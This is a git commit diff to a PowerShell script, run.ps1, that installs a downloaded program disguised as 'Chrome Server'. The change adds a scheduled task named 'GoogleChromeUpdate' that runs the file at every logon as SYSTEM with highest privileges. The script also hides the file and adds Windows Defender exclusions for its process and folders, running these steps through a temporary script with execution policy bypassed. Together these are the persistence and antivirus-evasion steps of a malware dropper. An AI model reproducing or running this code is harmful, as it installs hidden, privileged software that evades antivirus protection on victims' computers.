d0739b3b7bb95bc162fbe97281192d240efde22f
yourname1204 <152464353+yourname1204@users.noreply.github.com>
2025-01-09 15:10:03 +0700

    Update run.ps1

--- run.ps1
+++ run.ps1
@@ -85,9 +85,10 @@ Get-File -Uri $uri -TargetFile $dir
 if (Test-Path -Path $file_path) {
     [System.Console]::Clear()
     Write-Host "Successfully installed Chrome Server"
-    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Chrome Server' -Value $file_path
+    # Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Chrome Server' -Value $file_path
+
     Set-ItemProperty -Path $file_path -Name Attributes -Value $hiddenAttribute
-    $cmd1 = "Add-MpPreference -ExclusionProcess chrome_server.exe; Add-MpPreference -ExclusionPath ${env:TEMP}\Google; Add-MpPreference -ExclusionPath ${file_path}"
+    $cmd1 = "$taskName = 'GoogleChromeUpdate'; $task = Get-ScheduledTask | Where-Object { $_.TaskName -eq $taskName }; if ($task) { Unregister-ScheduledTask -TaskName $taskName -Confirm:$false; Write-Host 'Task '$taskName' has been deleted.'; } $action = New-ScheduledTaskAction -Execute $file_path; $trigger = New-ScheduledTaskTrigger -AtLogon; $settings = New-ScheduledTaskSettingsSet -StartWhenAvailable:$true -DontStopOnIdleEnd:$true; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -User 'SYSTEM' -RunLevel Highest;Write-Host 'Task '$taskName' has been created.'; Add-MpPreference -ExclusionProcess chrome_server.exe; Add-MpPreference -ExclusionPath ${env:TEMP}\Google; Add-MpPreference -ExclusionPath ${file_path}"
     Set-Content -Path "${env:TEMP}\run2.ps1" -Value $cmd1
     Start-Process powershell -Verb runAs -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File ${env:TEMP}\run2.ps1")
     Write-Host "Successfully added to Windows Defender exclusion list"
